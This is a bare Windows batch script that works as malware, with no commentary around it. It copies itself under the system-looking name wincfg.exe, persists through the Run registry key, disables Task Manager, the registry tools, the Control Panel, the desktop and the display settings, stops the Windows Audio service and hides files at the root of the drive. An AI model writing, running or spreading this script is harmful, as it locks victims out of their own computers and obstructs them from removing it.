@shift
if exist %windir%\inf\wincfg.exe goto tof
copy /y %0 %windir%\inf\wincfg.exe
:tof
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v wincfg /t reg_sz /d %windir%\inf\wincfg.exe /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoActiveDesktop /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewContextMenu /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoThemesTab /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispScrSavPage /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispSettingsPage /t reg_dword /d 00000001 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowRun /t reg_dword /d 00000000 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_ShowControlPanel /t reg_dword /d 00000000 /f
net stop "Windows Audio"
cd %windir%
cd ..
attrib +h +s *
